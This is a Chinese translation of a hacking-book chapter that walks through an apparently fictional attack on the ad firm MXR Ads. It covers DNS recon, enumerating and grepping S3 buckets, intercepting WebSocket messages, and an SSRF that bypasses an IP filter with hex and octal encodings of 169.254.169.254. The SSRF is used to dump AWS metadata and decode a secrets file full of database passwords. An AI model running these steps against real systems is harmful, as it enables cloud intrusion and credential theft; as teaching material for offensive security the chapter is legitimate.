# 第五章：漏洞探索

![](img/chapterart.png)

我们有大约 150 个领域需要探索各种漏洞：代码注入、路径遍历、错误的访问控制等等。对于新手黑客来说，面对如此多的可能性，往往会感到不知所措。该从哪里开始？我们应该在每个网站上花多少时间？每个页面呢？如果我们错过了什么怎么办？

这可能是最能挑战你信心的阶段。我会在本书中分享尽可能多的捷径，但相信我，当我说对于这个特定任务，世界上最古老的秘诀是最有效的：*你练得越多，做得越好*。你遇到的漏洞越奇妙、不可思议，你获得的信心就越多，不仅是在自己身上，也是在人的错误不可避免性上。

## 练习成就完美

那么，如何开始呢？完成夺旗（CTF）挑战是一种掌握 SQL 注入、跨站脚本（XSS）和其他 Web 漏洞基本原理的方法。但要注意，这些练习很难反映脆弱应用程序的现实；它们是由爱好者设计的有趣谜题，而不是由于诚实的错误或从 Stack Overflow 帖子中懒得复制粘贴的结果。

学习漏洞的最佳方式是尝试在安全环境中进行实验。例如，通过在实验室中启动一个 Web 服务器和一个数据库，编写一个应用并进行实验，来尝试 SQL 注入。发现不同 SQL 解析器的细微差别，编写自己的过滤器来防止注入，尝试绕过这些过滤器，等等。进入开发者的思维，面对解析未知输入来构建数据库查询或跨设备和会话持久化信息的挑战，你会很快发现自己会做出开发者常常犯的相同危险假设。正如俗话所说，每个伟大漏洞背后都隐藏着一个错误的假设，等待着借机得分。任何栈都适合进行实验：Apache + PHP，Nginx + Django，NodeJS + Firebase，等等。学习如何使用这些框架，了解它们存储设置和机密信息的地方，并确定它们如何对用户输入进行编码或过滤。

随着时间的推移，你将培养出敏锐的眼光，不仅能发现潜在的漏洞参数，还能了解它们是如何被应用程序操控的。你的思维方式将从“我如何让它工作？”转变为“我如何滥用或破坏它？”一旦这个齿轮开始在你脑海中转动，你将无法关闭它——相信我。

我也鼓励你看看别人都在做什么。我非常喜欢阅读研究人员在 Twitter、Medium 和其他平台上分享的漏洞赏金报告，比如 *https://pentester.land*。你不仅会被工具和方法论所启发，还会在某种程度上得到安慰，知道即使是最庞大的公司也会在最基本的功能上，如密码重置表单，出现失败。

幸好，对于我们的目的，我们并没有进行渗透测试工作，因此时间不是我们最担心的问题。实际上，时间是我们最宝贵的盟友。我们会在每个网站上花费我们认为必要的时间。你的灵感和好奇心就是你所需要的所有权限，可以让你整天玩弄任何给定的参数。

## 揭示隐藏域名

回到我们的域名列表。当处理一个完整的云环境时，有一个捷径可以帮助我们更好地了解网站，并确实让我们优先考虑它们：我们可以揭示隐藏在公共域名背后的真实域名。云服务提供商通常会为客户创建的每个资源（如服务器、负载均衡器、存储、托管数据库和内容分发端点）生成唯一的 URL。以全球内容分发网络（CDN）Akamai 为例。对于常规服务器，Akamai 会创建一个像 *e9657.b.akamaiedge.net* 这样的域名，以优化数据包传输到该服务器。但没有公司会认真地将这个无法发音的域名公开使用；他们会把它隐藏在一个像 *stellar.mxrads.com* 或 *victory.gretschpolitco.com* 这样华丽的名字后面。浏览器可能认为它正在与 *victory.gretschpolitico.com* 通信，但网络数据包实际上是发送到 *e9657.b.akamaiedge.net* 的 IP 地址，然后再转发到最终目标。

如果我们能够弄清楚这些隐藏的云域名，它们藏在我们获取的每个网站后面，我们也许能推测出这些网站依赖的云服务，从而将重点放在那些更容易出现配置错误的服务上：Akamai 很好，但 AWS S3（存储服务）和 API Gateway（托管代理）更加有趣，正如我们很快会看到的那样。或者，如果我们知道一个网站位于 AWS 应用负载均衡器后面，例如，我们可以预测某些参数过滤，从而调整我们的有效载荷。更有趣的是，我们可以尝试查找“源”或真实的服务器 IP 地址，从而绕过中介云服务。

让我们回到我们的域名列表，并将 DNS 调查再推进一步，以找出这些隐藏的域名。我们要寻找 *CNAME* *记录*（指向其他名称记录的名称记录），而不是 IP 地址（如更常见的 A 记录）。命令 `getent hosts` 可以提取这些 CNAME 记录：

```
root@Point1:~/# getent hosts thor.mxrads.com
91.152.253.4    e9657.b.akamaiedge.net stellar.mxrads.com
stellar.mxrads.com.edgekey.net
```

我们可以看到，*thor.mxrads.com* 确实位于 Akamai 的分发节点后面。

并非所有替代域名都注册为 CNAME 记录；有些是作为 ALIAS 记录创建的，在名称解析过程中不会明确显示出来。对于这些顽固的情况，我们可以通过查看 AWS 文档中发布的公共范围中的 IP 地址来猜测 AWS 服务，这些文档位于常规参考部分。

我找不到一个简单的工具来执行这种扩展的 DNS 探测，所以我编写了一个脚本来自动化这个过程：*DNS Charts*，可以在 [`dnscharts.hacklikeapornstar.com/`](https://dnscharts.hacklikeapornstar.com/) 找到。我们构建一个域名列表，然后将其输入到 DNS Charts 中，查找这些 CNAME 记录，并使用一些额外的正则表达式匹配来猜测云服务。结果会以彩色图表的形式展示，突出显示域名之间的基本交互，以及公司使用的主要云服务。图 5-1 显示了该工具的一些示例输出。

![f05001](img/f05001.png)

图 5-1：MXR Ads 使用的服务列表

只需一瞥这张图，我们就能清楚地看到首先要关注的最有趣的端点。我们检索到的大多数域名都托管在 AWS 上，并使用以下服务的混合：*CloudFront*，分发网络；*S3*，亚马逊的存储服务；以及 *ELB*，负载均衡器。其余域名使用 Akamai 分发网络。

请注意，GP（顶部中间）仪表板的 URL 指向一个属于 MXR Ads（底部左侧）的域名。我们关于它们紧密关系的猜测是正确的；这在它们各自的基础设施中得到了体现。

我们这里有一些线索。例如，*gretschpol-alb-1463804911.eu-west-1\. .* 子域名指向一个 AWS 应用负载均衡器（AWS ALB），这是由 URL 中的 *alb* 部分提示的。根据 AWS 文档，这是一个第 7 层负载均衡器，负责分配传入的流量。理论上，第 7 层负载均衡器能够解析 HTTP 请求，甚至在与 AWS Web 应用防火墙（AWS WAF）连接时阻止某些负载。是否真是如此还需要进一步推测，并且当然需要进行主动探测。

但是，应用负载均衡器可以稍等一下。我们一眼就看到了图表，已经找出了我们的获胜者。我们将从那诱人的 AWS S3 URL 开始。

## 调查 S3 URLs

AWS S3 是亚马逊提供的高度冗余且廉价的存储服务，起价仅为每 GB $0.023，另外还需支付数据传输费用。存储在 S3 中的对象被组织为 *存储桶*。每个存储桶都有一个独特的名称和 URL，适用于所有 AWS 账户（见图 5-2）。

![f05002](img/f05002.png)

图 5-2：S3 存储桶在 Web 控制台中的显示方式

S3 可以托管从 JavaScript 文件到数据库备份的任何内容。在许多大大小小的公司快速采用之后，你常常会听到在会议中提到某个随机文件时，人们说：“哦，放到 S3 上就行！”

这种集中在互联网上易于获取的数据吸引了黑客，犹如蜜蜂飞向花朵，而事实证明，无论是小公司还是知名企业，都曾因为此事成为丑闻的主角。公开且易受攻击的 S3 桶让这些公司丢失了数 TB 的敏感数据，如客户信息、交易历史等。如今，突破一家公司的安全从未如此简单。你甚至可以在[`buckets.grayhatwarfare.com/`](https://buckets.grayhatwarfare.com/)上找到公开 S3 桶的列表。

我们在图 5-1 中的小型 DNS 图展示了四个 S3 URL——dl.mxrads.com、misc.mxrads.com、assets.mxrads.com 和 resource.mxrads.com——但实际上可能还有更多需要揭示的内容。在检查这些桶之前，我们先将这些 URL 过滤掉。有时，Akamai 和 CloudFront 可以通过 ALIAS 记录隐藏 S3 桶。为了彻底，我们将遍历 18 个 Akamai 和 CloudFront 的 URL，并仔细查看 HTTP 响应中的`Server`指令：

```
root@Point1:~/# while read p; do \
**echo $p, $(curl --silent -I -i https://$p | grep AmazonS3) \**
**done <cloudfront_akamai_subdomains.txt**

digital-js.mxrads.com, Server: AmazonS3
streaming.mxrads.com, Server: AmazonS3
```

我们还要再添加两个桶。太好了。我们接着在浏览器中加载第一个桶的 URL：dl.mxrads.com（mxrads-files.s3.eu-west-1.amazonaws.com 的别名），希望能够访问桶中的内容。不幸的是，我们立刻被一个相当明确的错误信息拦住了：

![g05001](img/g05001.png)

`访问被拒绝`。

与这个消息可能暗示的相反，我们并没有被技术性地禁止访问桶中的对象。我们只是不能列出桶的内容，就像 Apache 服务器中的`Options -Indexes`指令禁用了目录列出一样。

### S3 桶安全性

在经历了一系列关于不安全 S3 桶的丑闻后，AWS 已经收紧了默认的访问控制。现在，每个桶都有一个类似公共开关的功能，用户可以轻松激活它来禁止任何类型的公共访问。这个功能看起来似乎很基础，然而桶的访问列表由不止一个、不止两个、不止三个，而是四个重叠的设置来管理，且都在这个公共开关下！真是复杂到极点。几乎可以原谅公司在配置时出现错误。这些设置如下：

1.  访问控制列表（ACL）明确规定了哪些 AWS 账户可以访问哪些资源（已弃用）。

1.  跨域资源共享（CORS）是对来自其他域的 HTTP 请求施加的规则和约束，可以根据请求的用户代理字符串、HTTP 方法、IP 地址、资源名称等进行筛选。

1.  桶策略 一种 JavaScript 对象表示法（JSON）文档，规则说明了哪些操作是允许的，谁可以执行，在哪些条件下可以执行。桶策略取代了 ACL，成为保护桶的名义方式。

1.  身份与访问管理（IAM）策略 类似于桶策略，但这些 JSON 文档附加在用户/组/角色上，而不是桶上。

这是一个桶策略示例，允许任何人从桶中获取对象，但禁止对桶进行任何其他操作，例如列出其内容、写入文件、更改其策略等：

```
{
  "Version":"2012-10-17",
  "Statement":[
    {
      "Sid":"UniqueID", // ID of the policy
      "Effect":"Allow", // Grant access if conditions are met
      "Principal": "*", // Applies to anyone (anonymous or not)
      "Action":["s3:GetObject"], // S3 operation to view a file
 "Resource":["arn:aws:s3:::bucketname/*"] // All files in the bucket
    }
  ]
}
```

AWS 结合这四个设置的规则来决定是否接受一个传入的操作。主控这些设置的是名为*Block public access*的总开关，当它开启时，会禁用所有公共访问，即使其中某个设置明确授权了公共访问。

复杂吗？那真是轻描淡写了。我鼓励你创建一个 AWS 账户，探索 S3 桶的复杂性，培养识别和滥用过于宽松 S3 设置的正确反应。

### 检查桶

回到我们的桶列表。我们浏览了一遍，除了*misc.mxrads.com*外，其他都无法访问，奇怪的是，*misc.mxrads.com*返回了一个空白页面。没有出现错误肯定是个好兆头。让我们使用 AWS 命令行进一步探查。首先，我们安装 AWS 命令行接口（CLI）：

```
root@Point1:~/# sudo apt install awscli
root@Point1:~/# aws configure
# Enter any valid set of credentials to unlock the CLI.
# You can use your own AWS account, for instance.
```

AWS CLI 不接受 S3 URL，因此我们需要弄清楚*misc.mxrads.com*背后的真实桶名。大多数时候，这个过程非常简单，只需要检查域名的 CNAME 记录，这个案例中返回的是 mxrads-misc.s3-website.eu-west-1.amazonaws.com。这告诉我们桶的名称是 mxrads-misc。如果检查 CNAME 不奏效，我们需要更多的技巧，比如在 URL 中注入特殊字符如`%C0`，或者附加无效的参数，试图让 S3 显示包含桶名称的错误页面。

拿到这个桶名后，我们可以利用 AWS CLI 的强大功能。首先，通过命令列出桶内所有对象，并将结果保存到一个文本文件中：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-misc > list_objects.txt
root@Point1:~/# head list_objects.txt
{ "Contents": [{
     "Key": "Archive/",
     "LastModified": "2015-04-08T22:01:48.000Z",
      "Size": 0,

 "Key": "Archive/_old",
     "LastModified": "2015-04-08T22:01:48.000Z",
     "Size": 2969,

     "Key": "index.html",
     "LastModified": "2015-04-08T22:01:49.000Z",
     "Size": 0,
    },
`--snip--`
```

我们得到了很多对象——太多了，无法手动检查。为了确切知道有多少个对象，我们使用 grep 来查找"Key"参数：

```
root@Point1:~/# grep '"Key"' list_objects.txt |wc -l
425927
```

万无一失！我们在这个单一的桶里存储了超过 40 万个文件。这已经算是一次非常不错的发现了。在对象列表中，注意到 S3 桶根目录下有一个空的*index.html*文件；S3 桶可以被设置为充当静态文件的网站托管，比如 JavaScript 代码、图片和 HTML 文件，而这个*index.html*文件就是导致我们之前运行 URL 时看到空白页面的原因。

是时候进行一些简易的数据挖掘了。让我们使用正则表达式查找 SQL 脚本、bash 文件、备份档案、JavaScript 文件、配置文件、VirtualBox 快照——任何可能为我们提供有价值凭证的内容：

```
# We extract the filenames in the "Key" parameters:
root@Point1:~/# grep '"Key"' list_objects | sed 's/[",]//g' > list_keys.txt

root@Point1:~/# patterns='\.sh$|\.sql$|\.tar\.gz$\.properties$|\.config$|\.tgz$'

root@Point1:~/# egrep $patterns list_keys.txt
  Key: debug/360-ios-safari/deploy.sh
 Key: debug/ias-vpaidjs-ios/deploy.sh
  Key: debug/vpaid-admetrics/deploy.sh
  Key: latam/demo/SiempreMujer/nbpro/private/private.properties
  Key: latam/demo/SiempreMujer/nbpro/project.properties
  Key: demo/indesign-immersion/deploy-cdn.sh
  Key: demo/indesign-immersion/deploy.sh
  Key: demo/indesign-mobile-360/deploy.sh
`--snip--`
```

这为我们提供了一些潜在的文件列表。然后我们使用`aws s3api get-object`下载这些候选文件，并系统地逐一检查它们，希望能够找到某种有效的凭证。一个值得注意的事实是，AWS 默认不记录 S3 对象操作，如 `get-object` 和 `put-object`，因此我们可以尽情下载文件，知道没有人会跟踪我们的行为。遗憾的是，AWS 的其他 API 并非如此。

几小时的研究后，我们仍然一无所获，什么都没有。似乎大多数脚本都是旧的三行代码，用于下载公共文档、获取其他脚本、自动化例行命令或创建虚拟 SQL 表。

是时候尝试一些其他的方法了。也许有些敏感数据文件逃过了我们之前的模式过滤，也许有些带有不常见扩展名的文件藏在一堆文件中。为了找到这些文件，我们进行了一次激进的反向搜索，排除了常见且无用的文件，如图片、层叠样式表（CSS）和字体，试图揭示一些隐藏的宝藏：

```
root@Point1:~/# egrep -v\
**"\.jpg|\.png|\.js|\.woff|/\",$|\.css|\.gif|\.svg|\.ttf|\.eot" list_keys.xt**

Key: demo/forbes/ios/7817/index.html
Key: demo/forbes/ios/7817/index_1.html
Key: demo/forbes/ios/7817/index_10.html
Key: demo/forbes/ios/7817/index_11.html
Key: demo/forbes/ios/7817/index_12.html
Key: demo/forbes/ios/7817/index_13.html
--`snip`--

root@Point1:~/# aws s3api get-object --bucket mxrads-misc \
**--key demo/forbes/ios/7817/index.html forbes_index.html**
```

HTML 文件并不是我们所期望的特殊文件，但由于它们占据了此存储桶中超过 75% 的文件，我们最好还是看一下。打开这些文件，我们看到它们似乎是来自世界各地新闻网站保存的页面。在这个混乱的 GP 基础设施中，某个应用程序正在抓取网页并将它们存储在这个存储桶里。我们想知道这是为什么。

还记得在引言中我提到的那个特别的*黑客风采*吗？这就是它。这样的发现应该会让你脊背发凉！

### 检查面向 Web 的应用程序

这个该死的应用程序藏在哪里？为了找出它，我们回到图 5-1 中的 DNS 侦察结果，果然，一个完美的嫌疑人从一堆中跳了出来，直截了当地出现在眼前：*demo.mxrads.com*。我们在包含 HTML 文件的 S3 键中也看到了相同的“demo”关键字。我们甚至不需要使用 `grep`。

我们在浏览器中输入*demo.mxrads.com*，看到主页的图片和标题似乎描述了我们正在寻找的行为（见图 5-3）。

![f05003](img/f05003.png)

图 5-3：demo.mxrads.com 的首页

为了更仔细地查看这个页面，我们启动了 Burp Suite，这是一款本地 Web 代理，方便地拦截并转发来自浏览器的每个 HTTP 请求（OWASP 粉丝可以使用 ZAP，Zed 攻击代理）。我们在运行 Burp 的情况下重新加载*demo.mxrads.com*，并看到网站发出的请求实时流出，如图 5-4 所示。

![f05004](img/f05004.png)

图 5-4：Burp 检查 MXR 广告演示页面

这是一个很好的攻击面。使用 Burp，我们可以拦截这些 HTTP(S) 请求，实时修改它们，随意重复它们，甚至可以配置正则表达式规则自动匹配和替换头信息。如果你曾经做过网页渗透测试或 CTF 挑战，肯定用过类似的工具。但我们先放一放这个，继续我们的调查。

我们返回检查 *demo.mxrads.com* 网站。正如我们从像 MXR Ads 这样的公司所预料的，这个网站提供在多个浏览器和设备上展示演示广告的功能，还可以在一些知名网站上展示广告，例如 *nytimes.com* 和 *theregister.com*（见图 5-5）。全球的销售团队可能会利用这些功能来说服媒体合作伙伴，他们的技术可以与任何网页框架无缝集成。真是挺聪明的。

*![f05005](img/f05005.png)

图 5-5：MXR Ads 功能在多个流行网站上展示广告

我们将通过尝试这个功能来检查页面。我们选择在 *纽约时报* 网站上展示广告，随后一个新的内容窗口弹出，展示了一个精美的随机香水品牌广告，广告位于今天纽约时报主页的中间。

这个演示页面看起来可能是一个无害的功能：我们指定一个网站，应用程序获取其实际内容，并添加一个带有随机广告的视频播放器，向潜在客户展示 MXR Ads 能做些什么。它可能引入什么漏洞呢？有很多……

在我们研究如何利用这个应用之前，先用 Burp Proxy 评估一下背后的情况。当我们点击 NYT 选项来展示广告时会发生什么？我们在图 5-6 中可以看到结果。

![f05006](img/f05006.png)

图 5-6：我们点击 *demo.mxrads.com* 上的 NYT 选项后，HTTP 历史标签页的内容

我们没有看到太多 HTTP 流量，这点是肯定的。网页加载完成后，服务器以“HTTP/1.1 101 Switching Protocols”消息响应，然后 HTTP 历史标签页中再没有任何通信。我们需要切换到 WebSockets 历史标签页，以继续跟踪剩余的交换过程。

### 使用 WebSocket 进行拦截

*WebSocket* 是一种与 HTTP 并行的通信协议，但不同于 HTTP，WebSocket 是一个全双工通信通道。在常规的 HTTP 协议中，每个服务器响应都对应一个客户端请求。服务器不会在两个请求之间保持状态；而是通过 cookies 和 headers 来处理状态，这些帮助后端应用程序记住是谁在访问哪个资源。WebSocket 的工作方式不同：客户端和服务器建立一个全双工和绑定的通道，双方都可以随时发起通信。一个 outgoing 消息可能会对应多个 incoming 消息，反之亦然。（关于 WebSocket 的更多信息，查看 [`blog.teamtreehouse.com/an-introduction-to-websockets/`](https://blog.teamtreehouse.com/an-introduction-to-websockets/)。）WebSocket 的一个美妙之处在于，它们不需要 HTTP cookies，因此也不需要支持它们。这些 cookies 正是用来维持用户认证会话的！所以当会话从 HTTP 切换到 WebSocket 时，便有机会通过直接使用 WebSocket 而不是 HTTP 获取敏感资源，从而绕过访问控制——但这属于另一类漏洞，下次再聊。图 5-7 显示了我们的 WebSocket 历史标签。

![f05007](img/f05007.png)

图 5-7：*demo.mxrads.com* 的 WebSocket 历史标签

WebSocket 通信看起来相当简单：每条发往服务器的消息都由一个 URL（*nytimes.com*）组成，后面跟着与用户浏览器相关的指标（Mozilla/5.0...），以及要显示的广告的标识符（437）。Burp 无法重放（在 Burp 术语中称为 *repeat*）过去的 WebSocket 通信，因此要篡改 WebSocket 消息，我们需要从 demo 网站手动触发它。

我们在 Burp 选项中开启拦截模式，这将允许我们捕捉下一个交换的消息，并实时更新（见 图 5-8）。例如，让我们看看是否能让 MRX Ads 网站获取我们在第三章设置的 Nginx 容器的主页。

![f05008](img/f05008.png)

图 5-8：在 Burp 中拦截网页

我们将修改后的请求转发，并前往我们的 Docker 容器查看日志。我们使用 `docker ps` 获取容器 ID，然后将其传递给 `docker logs`：

```
root@Nginx:~/# docker ps
CONTAINER ID        IMAGE                COMMAND
5923186ffda5        sparcflow/ngi...   "/bin/bash /sc..."

root@Nginx:~/# docker logs 5923186ffda5
54.221.12.35 - - [26/Oct/2020:13:44:08 +0000] "GET / HTTP/1.1"...
```

MXR Ads 应用确实实时获取 URL！你问为什么这么厉害？嗯，并不是所有的域名和 IP 地址都是一样的，你知道吗？某些 IP 地址有特定的用途。一个典型的例子是 127.0.0.0/8 阻止，它指向回环地址（即主机自身），或者 192.168.0.0/16，这是为私有网络保留的。一个较少为人知的 IP 地址范围是 169.254.0.0/16，这是由互联网工程任务组（IETF）为链路本地寻址保留的，这意味着这个范围仅对网络内部的通信有效，不能路由到互联网。例如，每当一台计算机无法通过 DHCP 获取 IP 地址时，它会自行为自己分配一个该范围内的 IP 地址。更重要的是，这个范围还被许多云服务提供商用于将私有 API 暴露给它们的虚拟机，以便它们了解自己的环境。

在几乎所有的云服务提供商中，调用 IP 地址 169.254.169.254 会被路由到虚拟机监控程序，并获取有关内部事项的信息，如机器的主机名、内部 IP 地址、防火墙规则等。这是一个包含大量元数据的宝库，可以让我们一窥公司的内部架构。

我们来试试吧，怎么样？在 Burp 截取模式仍然开启的情况下，我们触发另一个 WebSocket 消息，以在《纽约时报》上展示一个广告，但这次我们将消息体中的 URL 替换为默认的 AWS 元数据 URL，*http://169.254.169.254/latest*，如下面所示：

```
# Modified WebSocket message:
http://169.254.169.254:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...
```

我们等待服务器的响应——记住它是异步的——但什么也没有返回。

MXR Ads 并没有让事情变得简单。可以合理推测，应用中明确禁止了该 URL，正是出于这个原因。或者也许应用只是期望一个有效的域名？我们可以将元数据 IP 替换为一个更无害的 IP 地址（例如我们 Nginx 容器的 IP）：

```
# Modified WebSocket message:
http://54.14.153.41/:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...
```

我们检查日志，果然，看到来自应用的请求传了过来：

```
root@Point1:~/# docker logs 5923186ffda5
54.221.12.35 - - [26/Oct/2020:13:53:12 +0000] "GET / HTTP/1.1"...
```

好吧，有些 IP 地址是被允许的，但 169.254.169.254 必须在应用中被明确禁止。是时候拿出我们的脏字符串解析技巧了。尽管 IP 地址通常以十进制格式表示，但浏览器和 Web 客户端实际上也能接受更为冷门的表示法，比如十六进制或八进制。例如，以下所有的 IP 地址是等效的：

```
http://169.254.169.254
http://0xa9fea9fe # hexadecimal representation
http://0xA9.0xFE.0xA9.0xFE # dotted hexadecimal
http://025177524776 # octal representation
http://①⑥⑨.②⑤④.①⑥⑨.②⑤④ # Unicode representation
```

我们可以尝试通过尝试其十六进制、点分十六进制和八进制的替代形式来绕过 IP 地址禁令。

在这种情况下，简单的十六进制格式化即可完成任务，我们得到了 AWS 元数据 API 的著名输出，如 图 5-9 所示。

![f05009](img/f05009.png)

图 5-9：AWS 元数据 URL 的输出

在 图 5-9 的底部的 Raw 部分，字符串 1.0、2007-01-19、2007-03-01 等是元数据端点的不同版本。我们可以使用路径中的关键字 */latest* 来获取尽可能多的数据，而不是指定特定的日期，正如我们将在下一节中看到的。

这个输出当然确认了我们有一个有效的服务器端请求伪造案例。是时候造成一些损害了！

## 服务器端请求伪造

*服务器端请求伪造（SSRF）* 攻击是指我们强迫某些服务器端应用向我们选择的域发起 HTTP 请求。这有时能让我们访问内部资源或未受保护的管理员面板。

### 探索元数据

我们开始收集关于运行此网页获取应用程序的机器的基本信息，再次使用 Burp 的拦截模式。在拦截我们的请求后，我们将十六进制编码的元数据 IP 替换为原始请求的 URL，然后将 AWS 的元数据 API 名称附加到末尾，如 Listing 5-1 所示。

```
# AWS Region
http://0xa9fea9fe/latest/meta-data/placement/availability-zone
eu-west-1a

# Instance ID
http://0xa9fea9fe/latest/meta-data/instance-id
1 i-088c8e93dd5703ccc

# AMI ID
http://0xa9fea9fe/latest/meta-data/ami-id
2 ami-02df9ea15c1778c9c

# Public hostname
http://0xa9fea9fe/latest/meta-data/public-hostname
3 ec2-3-248-221-147.eu-west-1.compute.amazonaws.com
```

Listing 5-1：从元数据 API 获取的 Web 应用基本信息

从中我们看到示范应用运行在 `eu-west-1` 区域，这表示它位于亚马逊位于爱尔兰的数据中心之一。AWS 提供了数十个区域。尽管公司努力将其最重要的应用分布在多个区域，但辅助服务和有时的后端通常会集中在少数几个区域中。实例 ID 是分配给每个在 EC2 服务中启动的虚拟机的唯一标识符，其值为 `i-088c8e93dd5703ccc` 1。当执行针对运行广告应用程序的机器的 AWS API 调用时，这些信息可能会非常有用。

镜像 ID `ami-02df9ea15c1778c9c` 2 指的是用于运行该机器的快照，例如 Ubuntu 或 CoreOS 镜像。机器镜像可以是公开的（所有 AWS 客户都可用）或私有的（仅对特定账户可用）。这个特定的 AMI ID 是私有的，因为它无法在 AWS EC2 控制台上找到。如果该 AMI ID 不是私有的，我们本可以启动该快照的类似实例来测试未来的有效载荷或脚本。

最后，公共主机名为我们提供了直接通往运行示范应用程序（或 AWS 行话中的 *EC2 实例*）的路径，前提是本地防火墙规则允许我们访问它。该机器的公共 IP 可以从其规范主机名推导出来：`3.248.221.147` 3。

说到网络配置，让我们从元数据 API 获取防火墙配置，如 Listing 5-2 所示。了解现有的防火墙规则可以帮助我们推测出与该系统交互的其他主机以及可能运行的服务，即使它们并不对外公开。防火墙规则由名为 *安全组* 的对象进行管理。

```
# MAC address of the network interface
http://0xa9fea9fe/latest/meta-data/network/interfaces/macs/
06:a0:8f:8d:1c:2a

# AWS Owner ID
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/owner-id
886371554408

# Security groups
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/security-groups
elb_http_prod_eu-west-1
elb_https_prod_eu-west-1
common_ssh_private_eu-west-1
egress_internet_http_any

# Subnet ID where the instance lives
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-id
subnet-00580e48

# Subnet IP range
http://0xa9fea9fe/.../macs/06:a0:8f:8d:1c:2a/subnet-ipv4-cidr-block
172.31.16.0/20
```

Listing 5-2：Web 应用的防火墙配置

我们需要网络的 MAC 地址来从元数据 API 中检索网络信息。AWS 账户所有者用于构建 *Amazon 资源名称* *(ARNs)*，这是用于标识用户、策略和几乎所有 AWS 资源的唯一标识符；这些信息在未来的 API 调用中非常有用。ARN 对每个账户都是唯一的，因此 MXR Ads 的账户 ID 是并将始终保持 886371554408 —— 即使一个公司可能且通常会有多个 AWS 账户，正如我们稍后会看到的那样。

我们只能列出安全组的名称，而不能列出实际的防火墙规则，但这已经提供了足够的信息来推测实际的防火墙规则。例如，`elb_http_prod_eu-west-1` 集合中的 `elb` 部分表明该集合很可能允许负载均衡器访问服务器。第三个安全组很有趣：`common_ssh_private-eu-west-1`。根据其名称，可以合理推测只有少数几台机器，通常被称为 *bastions*，能够通过 SSH 连接到其余的基础设施。如果我们能够以某种方式进入其中一个珍贵的实例，那将为我们打开许多、许多的门！有趣的是，我们仍然被困在组织外面，但已经能够对其基础设施设计理念有些许了解。

### 元数据 API 的脏秘密

当然，我们还远未完成，所以让我们再加把劲。正如我们在第三章中看到的，AWS 提供了在机器首次启动时执行脚本的功能。这个脚本通常被称为 *user-data*。我们曾用它来设置自己的基础设施并启动 Docker 容器。好消息——这个同样的 *user-data* 可以通过元数据 API 通过一次查询获取。通过向 Burp 发送另一个请求到 MXR Ads 演示应用，我们可以看到他们肯定使用了它来设置自己的机器，如 示例 5-3 所示。

```
# User data information
http://0xa9fea9fe/latest/user-data/

# cloud-config
1 coreos:
  units:
  - command: start
    content: |-
      [Unit]
      Description=Discover IPs for external services
      Requires=ecr-setup.service
`--snip--`
```

示例 5-3：在机器首次启动时执行的 *user-data* 脚本片段

我们看到一大波数据流在屏幕上滚动，心中充满了温暖和愉快的感觉。这就是 SSRF 的辉煌表现。让我们检查一下通过这个命令得到的数据。

除了接受普通的 bash 脚本，*cloud-init* 还支持 *cloud-config* 文件格式，它使用声明性语法来准备和调度启动操作。*Cloud-config* 被许多发行版所支持，包括 CoreOS，看起来它是支持这台机器的操作系统 1。

*Cloud-config* 使用 YAML 语法，利用空格和换行符来分隔列表、值等。*cloud-config* 文件描述了设置服务、创建账户、执行命令、写入文件和执行启动操作中其他任务的指令。一些人发现它比粗糙的 bash 脚本更简洁、更容易理解。

让我们分解一下我们检索到的 *user-data* 脚本中最重要的部分（见 示例 5-4）。

```
--`snip`--
- command: start
  content: |
  1 [Service]   # Set up a service
    EnvironmentFile=/etc/ecr_env.file # Env variables

 2 ExecStartPre=**/usr/bin/docker pull** ${URL}/**demo-client**:master

    3 ExecStart=**/usr/bin/docker** run \
        -v /conf_files/logger.xml:/opt/workspace/log.xml \
        --net=host \
 **--env-file=/etc/env.file** \
        --env-file=/etc/java_opts_env.file \
      4 --env-file=/etc/secrets.env \
        --name demo-client \
        ${URL}/demo-client:master \
--`snip`--
```

示例 5-4：*user-data* 脚本的继续部分

首先，该文件设置了一个将在机器启动时执行的服务 1。这个服务拉取`demo-client`应用镜像 2，并使用精心配置的`docker` `run`命令 3 启动容器。

请注意，多个`--env-file`开关 4 要求 Docker 从自定义文本文件加载环境变量，其中一个文件恰巧命名为*secrets.env*！当然，百万美元的问题是，这些文件到底存放在哪里？

它们有可能直接嵌入到 AMI 镜像中，但如果是那样，更新配置文件对于 MXR Ads 来说将是登上珠穆朗玛峰般的不便。要更新数据库密码，公司需要制作并发布一个新的 CoreOS 镜像。这显然效率不高。不，概率更大的是，*secrets.env*文件要么是通过 S3 动态获取的，要么直接嵌入到相同的*user-data*脚本中。事实上，如果我们继续向下滚动，我们会看到以下片段：

```
`--snip--`
write_files:
- content: H4sIAEjwoV0AA13OzU6DQBSG4T13YXoDQ5FaTFgcZqYyBQbmrwiJmcT+Y4Ed6/...
  encoding: gzip+base64
  path: /etc/secrets.env
  permissions: "750"
`--snip--`
```

精彩。这段二进制数据经过 base64 编码，所以我们将解码、解压，并惊叹其内容，如列表 5-5 所示。

```
root@Point1:~/# echo H4sIAAA...|base64 -d |gunzip

ANALYTICS_URL_CHECKSUM_SEED = 180309210013
CASSANDRA_ADS_USERSYNC_PASS = QZ6bhOWiCprQPetIhtSv
CASSANDRA_ADS_TRACKING_PASS = 68niNNTIPAe5sDJZ4gPd
CASSANDRA_ADS_PASS = fY5KZ5ByQEk0JNq1cMM3
CASSANDRA_ADS_DELIVERYCONTROL_PASS = gQMUUHsVuuUyo003jqFU
IAS_AUTH_PASS = PjO7wnHF9RBHD2ftWXjm
ADS_DB_PASSWORD = !uqQ#:9#3Rd_cM]
```

列表 5-5：包含密码的解码*secrets.env*文件片段

赚到了！这个二进制数据包含了多个访问 Cassandra 集群的密码（Cassandra 是一种高度弹性的 NoSQL 数据库，通常用于处理大规模数据并保持最小的延迟）。我们还得到了两个含有无限潜力的密码。当然，仅凭密码还不够。我们还需要关联的主机和用户名，而应用程序也是如此，因此我们可以假设列表 5-4 中的第二个环境文件*env.file*应包含所有缺失的信息。

然而，在继续向下滚动*user-data*时，我们并没有找到*env.file*的定义。但我们确实发现了一个 shell 脚本*get-region-params.sh*，它似乎会重置我们宝贵的*env.file*（见列表 5-6）。

```
--`snip`--
 - command: start
   content: |-
       [Unit]
       Description=Discover IPs for external services
       [Service]
       Type=oneshot
       ExecStartPre=/usr/bin/rm -f /etc/env.file
 **ExecStart=/conf_files/get-region-params.sh**
